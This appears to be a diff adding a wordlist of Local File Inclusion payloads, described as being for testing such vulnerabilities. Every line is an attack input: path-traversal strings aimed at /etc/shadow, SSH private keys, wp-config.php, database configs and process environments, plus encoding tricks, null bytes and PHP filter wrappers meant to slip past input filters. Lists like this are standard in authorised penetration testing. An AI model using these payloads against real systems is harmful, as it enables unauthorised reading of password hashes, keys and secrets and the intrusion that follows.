@@ -1,0 +1,128 @@
+# LFI (Local File Inclusion) Payloads
+# Various payloads for testing Local File Inclusion vulnerabilities
+
+# Basic Linux/Unix file inclusion
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/hostname
+../../../etc/group
+../../../etc/issue
+../../../etc/motd
+../../../etc/fstab
+../../../etc/crontab
+
+# Process and system info (Linux)
+../../../proc/version
+../../../proc/cmdline
+../../../proc/meminfo
+../../../proc/cpuinfo
+../../../proc/self/environ
+../../../proc/self/cmdline
+../../../proc/self/stat
+../../../proc/self/status
+
+# Windows system files
+../../../windows/system32/drivers/etc/hosts
+../../../windows/win.ini
+../../../windows/system.ini
+../../../winnt/win.ini
+../../../winnt/system.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\WINNT\win.ini
+C:\WINNT\system.ini
+
+# Web server configuration files
+../../../etc/httpd/conf/httpd.conf
+../../../etc/apache2/apache2.conf
+../../../etc/apache2/sites-available/default
+../../../etc/nginx/nginx.conf
+../../../etc/nginx/sites-available/default
+../../../usr/local/apache/conf/httpd.conf
+../../../usr/local/nginx/conf/nginx.conf
+
+# Log files
+../../../var/log/apache/access.log
+../../../var/log/apache/error.log
+../../../var/log/apache2/access.log
+../../../var/log/apache2/error.log
+../../../var/log/nginx/access.log
+../../../var/log/nginx/error.log
+../../../var/log/httpd/access_log
+../../../var/log/httpd/error_log
+
+# Application configuration files
+../../../var/www/html/wp-config.php
+../../../var/www/html/config.php
+../../../var/www/html/configuration.php
+../../../var/www/html/settings.php
+../../../var/www/html/database.php
+../../../home/www/config.php
+
+# Database configuration
+../../../etc/mysql/my.cnf
+../../../etc/postgresql/postgresql.conf
+../../../var/lib/mysql/my.cnf
+
+# SSH configuration
+../../../etc/ssh/sshd_config
+../../../home/[username]/.ssh/id_rsa
+../../../home/[username]/.ssh/authorized_keys
+../../../root/.ssh/id_rsa
+../../../root/.ssh/authorized_keys
+
+# Null byte injection (older systems)
+../../../etc/passwd%00
+../../../etc/shadow%00
+../../../windows/system32/drivers/etc/hosts%00
+
+# Double encoding
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
+
+# UTF-8 encoding
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# Sixteen bit Unicode encoding
+..%u002f..%u002f..%u002fetc%u002fpasswd
+
+# Path traversal with different depths
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# URL encoding
+..%2F..%2F..%2Fetc%2Fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+
+# Mixed case encoding
+..%2F..%2f..%2Fetc%2fpasswd
+
+# Alternative separators
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\winnt\system32\drivers\etc\hosts
+
+# Using different file extensions to bypass filters
+../../../etc/passwd.txt
+../../../etc/passwd.log
+../../../etc/passwd.bak
+
+# Absolute paths
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/windows/system32/drivers/etc/hosts
+/winnt/system32/drivers/etc/hosts
+
+# PHP wrappers (if PHP is used)
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=string.rot13/resource=../../../etc/passwd
+file:///etc/passwd
+file:///windows/system32/drivers/etc/hosts
